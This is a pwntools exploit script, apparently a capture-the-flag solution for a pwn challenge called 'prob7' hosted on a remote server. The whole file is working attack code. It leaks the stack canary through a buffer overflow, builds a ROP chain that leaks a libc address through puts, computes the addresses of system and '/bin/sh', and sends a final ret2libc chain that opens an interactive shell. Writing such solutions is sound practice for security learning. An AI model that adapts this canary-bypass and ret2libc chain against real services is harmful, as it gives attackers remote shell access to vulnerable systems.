from pwn import *
context.terminal=['tmux', 'splitw', '-h']

#p = process("./prob7")
p = remote("fsi.zzado.kr", 9937)
e = ELF("./03 Pwn/prob7/prob7")
lib = ELF('./03 Pwn/prob7/libc.so.6')

r = ROP(e)
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = r.find_gadget(['ret'])[0]

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']

#gdb.attach(p,'b* vulns')
p.recv()


payload =  b'a' * 0x28
payload += b'b'
p.send(payload)

canary = b"\x00" + p.recv().split(payload)[1][:7]
log.info(f'canary : {canary}')

p.sendline(b'N')
p.recv()

payload = b'a' * 0x28
payload += canary
payload += b'c' * 0x8 # SFP
payload += p64(pop_rdi)
payload += p64(puts_got)
#payload += p64(ret_gadget)
payload += p64(puts_plt)
payload += p64(main)

p.send(payload)
p.recvuntil(b'a'*0x28)

## Leak libc
leak_data = u64(p.recv()[1:7] + b"\x00\x00" )
libc_base = leak_data - lib.symbols['puts']
system = libc_base + lib.symbols['system']
binsh = libc_base + next(lib.search(b'/bin/sh'))

log.info(f'libc_base : {hex(libc_base)}')
log.info(f'puts addr :: {hex(leak_data)}')
log.info(f'system : {hex(system)}')

# # system("/bin/sh")
payload = b'a' * 0x28
payload += canary
payload += b'c' * 0x8 # SFP
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret_gadget)
payload += p64(system)

p.send(payload)

p.interactive()